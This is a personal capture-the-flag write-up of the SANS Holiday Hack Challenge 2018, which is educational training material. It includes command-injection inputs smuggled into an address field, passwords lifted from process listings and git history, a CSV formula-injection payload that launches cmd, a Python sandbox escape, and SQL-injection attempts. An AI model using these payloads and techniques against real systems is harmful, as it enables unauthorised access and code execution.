@@ -1,0 +1,287 @@
+SANSHolidayHackChallenge@counterhack.com objectives
+
+First a big thankyou to everyone who put in time and effort to make this challenge a reality.
+I loved the talks, also the good range of challenges have helped me learn more in the last few weeks than I managed in the last six months. I can't wait to see how others tackled the questions especially onwards from 6.
+
+Question 1 Orientation Challenge
+What phrase is revealed when you answer all of the KringleCon Holiday Hack History questions? .
+
+Essential Editor Skills Cranberry Pi terminal challenge
+exit vi
+[esc] :q!
+
+What phrase is revealed when you answer all of the KringleCon Holiday Hack History questions?
+Watched Ed Skoudis’ talk called START HERE... answered all of the questions at the KringleCon Holiday Hack History kiosk.
+
+What phrase is revealed ?"Happy Trails"
+
+Question 2 Directory Browsing
+Who submitted (First Last) the rejected talk titled ? Please analyze the CFP site to find out. 
+
+The Name Game Cranberry Pi terminal challenge
+Select options from  terminal
+Option [2]
+Enter address of server: [enter]
+shows sqlite version 3 and name of database onboard.db
+Option [2] again
+Enter address of server: & sqlite3 onboard.db
+
+sqlite>.schema #check table name and 
+sqlite>select * from onboard.db;
+
+scroll through result to find record Scott Chan
+Option [2] again
+Enter address of server: & runtoanswer
+Enter Mr. Chan's first name: Scott
+
+Who submitted (First Last) the rejected talk titled Data Loss for Rainbow Teams: A Path in the Darkness?
+analyze the CFP site https://cfp.kringlecastle.com/
+https://cfp.kringlecastle.com/cfp/cfp.html
+https://cfp.kringlecastle.com/cfp/
+clicked on https://cfp.kringlecastle.com/cfp/rejected-talks.csv
+copied csv data to notepad searched for "rainbow"
+found entry containing Data Loss for Rainbow Teams: A Path in the Darkness "John McClane"
+
+Question 3 de Bruijn Sequences
+The KringleCon Speaker Unpreparedness room is a place for frantic speakers to furiously complete their presentations. The room is protected by a door passcode. Upon entering the correct passcode, what message is presented to the speaker? .
+Lethal ForensicELFication Cranberry Pi terminal challenge
+Find the first name of the elf of whom a love poem was written
+history
+ls -lA
+vim ~/.secrets/her/poem.txt
+cat .viminfo
+Last Substitute Search Pattern:
+~MSle0~&Elinore
+# Last Substitute String:
+$NEVERMORE
+NEVERMORE substituted for Elinore
+runtoanswer
+Who was the poem written about? Elinore
+
+clicked on door code and inspected with chrome
+clicked on first symbol triangle and recorded result '0'
+clicked square recorded '1'
+clicked circle recorded '2'
+clicked star recorded '3'
+from the hints went to http://www.hakank.org/comb/debruijn.cgi
+substituted the values given by Tangle Coalbox k=4 n=4
+then started manually entering the sequence until the door opened
+
+When you break into the speaker unpreparedness room, what does Morcel Nougat say? "Welcome unprepared speaker!"
+
+Question 4 Data Repo Analysis
+Retrieve the encrypted ZIP file from the North Pole Git repository. What is the password to open this file? .
+
+Stall Mucking Report Cranberry Pi terminal challenge
+Checked the hint https://blog.rackspace.com/passwords-on-the-command-line-visible-to-ps
+ls#see file report.txt
+ps aux
+ps aux > psaux.txt
+cat psaux.txt
+
+root         1  0.0  0.0  17952  2880 pts/0   Ss   12:38   0:00 /bin/bash /sbin/init
+root       10  0.0  0.0  49532  3228 pts/0   S   12:38   0:00 sudo -u manager /home/man
+ager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argumen
+t --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppr
+ess --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload
+root       11  0.0  0.0  49532  3312 pts/0   S   12:38   0:00 sudo -E -u manager /usr/b
+in/python /home/manager/report-check.py
+manager     15  0.0  0.0   9500  2516 pts/0   S   12:38   0:00 /bin/bash /home/manager/s
+amba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do
+-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --
+suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload
+manager     16  0.0  0.0  33848  8280 pts/0   S   12:38   0:00 /usr/bin/python /home/man
+ager/report-check.py
+
+smbclient //localhost/report-upload/ directreindeerflatterystable -U report-upload
+smb: \> put report.txt
+
+What is the password to open this file?
+Went to git repository at https://git.kringlecastle.com/Upatree/santas_castle_automation
+searched through the commits
+found "removing accidental commit"
+Password = 'Yippee-ki-yay'
+searched git repository for .zip
+found and downloaded ventilation_diagram.zip
+opened with password "Yippee-ki-yay" to verify
+printed both maps for the Google Ventilation System
+
+Question 5 AD Privilege Discovery
+Using the data set contained in this SANS Slingshot Linux image, find a reliable path from a Kerberoastable user to the Domain Admins group. What’s the user’s logon name (in username@domain.tld format)? Remember to avoid RDP as a control path as it depends on separate local privilege escalation flaws. .
+
+CURLing Master Cranberry Pi terminal challenge
+history
+curl --http2-prior-knowledge http://localhost:8080/index.php
+To turn the machine on, simply POST to this URL with parameter "status=on"
+curl --http2-prior-knowledge --data "status=on" -X POST
+http://localhost:8080/index.php
+
+Using the data set contained in this SANS Slingshot Linux image, find a reliable path from a Kerberoastable user to the Domain Admins group. What’s the user’s logon name? Remember to avoid RDP as a control path as it depends on separate local privilege escalation flaws.
+download image file https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova
+attempted to spin-up vm in virtual-box but was unable to boot
+re-downloaded image and attempted again with no success
+after a suitable amount of hair pulling and switching from coffee to beer I realised it must be a configuration issue and not part of the challenge
+changed os version from 32-bit to 64-bit and was happy to see the kernel loading
+ran BloodHound then watched Raphael Mudge's BloodHound demo - BloodHound - Analyzing Active Directory Trust Relationships 
+[More Info]
+[pathfinding]
+[Queries]
+[Shortest path to Domain Admins from Kerberoastable users]
+visually checked for shortest path remembering to avoid RDP as a control path as it depends on separate local privilege escalation flaws.
+shortest path coincidentally also the only path without RDP as a control path.
+User's login name "LDUBEJ00320@AD.KRINGLECASTLE.COM"
+
+Question 6 Badge Manipulation
+Bypass the authentication mechanism associated with the room near Pepper Minstix. A sample employee badge is available. What is the access control number revealed by the door authentication panel?
+
+Yule Log Analysis Cranberry Pi terminal challenge
+watched Paul Asadoorian's talk on Password Spraying with MailSniper.ps1 https://securityweekly.com/2017/07/21/tsw11/
+ls
+using the python script to convert to xml
+python evtx_dump.py ho-ho-no.evtx > xmasdump.xml
+grep @
+started running runtoanswer and running iterations of usernames
+got lucky second go "minty.candycane"
+
+What is the access control number revealed by the door authentication panel?
+Opened and viewed Alabaster Snowball's sample employee badge
+followed Pepper Minstix hints to https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF#Auth_Bypass
+https://www.the-qrcode-generator.com/
+
+Created Sql Injection within QR code generator (Ended up trying about 50 variations... I can't wait to learn how I should have approached it to progress!!!
+
+With Burp Suite running generated error code 
+{"data":"EXCEPTION AT (LINE 96 \"user_info = query(\"SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 
+AND uid = '{}' LIMIT 1\".format(uid))\"): (1064, u\"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' LIMIT 1' at line 1\")","request":false}
+
+decided put the SQL injection on the back-burner spend some time on the maze for diversion.
+following the maps acquired earlier completed the maze and found it dropped me out into the room on the other side of this challenge.
+
+Question 7 HR Incident Response
+Santa uses an Elf Resources website to look for talented information security professionals. Gain access to the website and fetch the document C:\candidate_evaluation.docx. Which terrorist organization is secretly supported by the job applicant whose name begins with "K."
+
+Dev Ops Fail Cranberry Pi terminal challenge
+git log
+commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
+Author: Sparkle Redberry <sredberry@kringlecon.com>
+Date:   Thu Nov 8 21:11:03 2018 -0500
+
+ Per @tcoalbox admonishment, removed username/password from config.js, default settings
+ in config.js.def need to be updated before use
+
+commit b2376f4a93ca1889ba7d947c2d14be9a5d138802
+Author: Sparkle Redberry <sredberry@kringlecon.com>
+Date:   Thu Nov 8 13:25:32 2018 -0500
+
+    Add passport module
+
+/kcconfmgmt/server/config cat config.js.def Database URL module.exports 
+= {'url' : 'mongodb://username:password@127.0.0.1:27017/node-api'};
+
+so know the format now need to check for changes between commits
+
+git diff b2376f4a93ca1889ba7d947c2d14be9a5d138802
+60a2ffea7520ee980a5fc60177ff4d0633f2516b
+yields commit change - -// Database URL
+-module.exports = {-   'url' : 'mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api'-};
+git log
+
+password - 'twinkletwinkletwinkle'
+
+Which terrorist organization is secretly supported by the job applicant whose name begins with "K."
+
+After watchingBrian Hostetler's talk and several attempts at crafting a .csv payload in notedpad. 
+I could get a working payload to run calculator or notepad on my machine local machine but I wasn't sure what to include in my payload to allow access to the  candidate_evaluation.docx
+I'm clearly missing some fundamental knowledge!
+
+UserId,Date,Objective,Description
+1,2018-12-25,"HRIncidentResponse","Not Elf on a Shelf"
+2,2018-12-25,"HRIncidentResponse","Santa'sLittle Helper"
+3,2018-12-25,"HRIncidentResponse","=2+5+cmd|' /C calc'!A0"
+
+Question 8 Network Traffic Forensics
+Santa has introduced a web-based packet capture and analysis tool to support the elves and their information security work. Using the system, access and decrypt HTTP/2 network activity. What is the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball? For hints on achieving this objective, please visit SugarPlum Mary and help her with the Python Escape from LA Cranberry Pi terminal challenge.
+
+Python Escape from LA Cranberry Pi terminal challenge
+watched Mark Baggett's talk "Escaping Python Shells"
+tried command exec 'Use of the command exec is prohibited for this question.'
+then eval '<built-in function eval>'
+
+>>>eval
+>>>xmas=eval('__imp' + 'ort__("os")')
+>>>xmas.system("ls")
+>>>xmas.system("./i_escaped")
+
+What is the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball?
+https://packalyzer.kringlecastle.com/
+
+Question 9 Ransomware Recovery
+Alabaster Snowball is in dire need of your help. Santa's file server has been hit with malware. Help Alabaster Snowball deal with the malware on Santa's server by completing several tasks. For hints on achieving this objective, please visit Shinny Upatree and help him with the Sleigh Bell Lottery Cranberry Pi terminal challenge.
+
+Sleigh Bell Lottery Cranberry Pi terminal challenge
+ls
+using the hint resource https://pen-testing.sans.org/blog/2018/12/11/using-gdb-to-call-random-functions
+running program in gdb
+gdb sleighbell-lotto
+(gdb) run
+Starting program: /home/elf/sleighbell-lotto 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+The winning ticket is number 1225.
+Rolling the tumblers to see what number you'll draw...
+You drew ticket number 7118!
+Sorry - better luck next year!
+[Inferior 1 (process 26) exited normally]
+quit
+
+multiple iterations winning ticket number is always 1225
+the ticket you draw changes each time though
+show list of functions
+nm sleighbell-lotto
+00000000000014ca T main
+                U malloc@@GLIBC_2.2.5
+                U memcpy@@GLIBC_2.14
+                U memset@@GLIBC_2.2.5
+                U printf@@GLIBC_2.2.5
+                U puts@@GLIBC_2.2.5
+                U rand@@GLIBC_2.2.5
+0000000000000a70 t register_tm_clones
+                U sleep@@GLIBC_2.2.5
+00000000000014b7 T sorry
+                U srand@@GLIBC_2.2.5
+                U strlen@@GLIBC_2.2.5
+                U time@@GLIBC_2.2.5
+0000000000000f18 T tohex
+0000000000208060 D winnermsg
+0000000000000fd7 T winnerwinner
+
+gdb sleighbell-lotto
+set break point (gdb) break main
+call functions (gdb) jump winnerwinner
+
+With gdb you fixed the race.
+The other elves we did out-pace.
+  And now they'll see.
+  They'll all watch me.
+I'll hang the bells on Santa's sleigh!
+Congratulations! You've won, and have successfully completed this challenge.
+[Inferior 1 (process 34) exited normally]
+
+Then create a rule that will catch all new infections. What is the success message displayed by the Snort terminal? 
+
+Question 10
+After completing the prior question, Alabaster gives you a document he suspects downloads the malware. What is the domain name the malware in the document downloads from?
+
+Question 11
+Analyze the full malware source code to find a kill-switch and activate it at the North Pole's domain registrar HoHoHo Daddy.
+What is the full sentence text that appears on the domain registration success message (bottom sentence)?
+
+Question 12
+After activating the kill-switch domain in the last question, Alabaster gives you a zip file with a memory dump and encrypted password database. Use these files to decrypt Alabaster's password database. What is the password entered in the database for the Vault entry? 
+
+Question 13
+Use what you have learned from previous challenges to open the door to Santa's vault. What message do you get when you unlock the door? 
+
+Question 14
+Who was the mastermind behind the whole KringleCon plan?
+
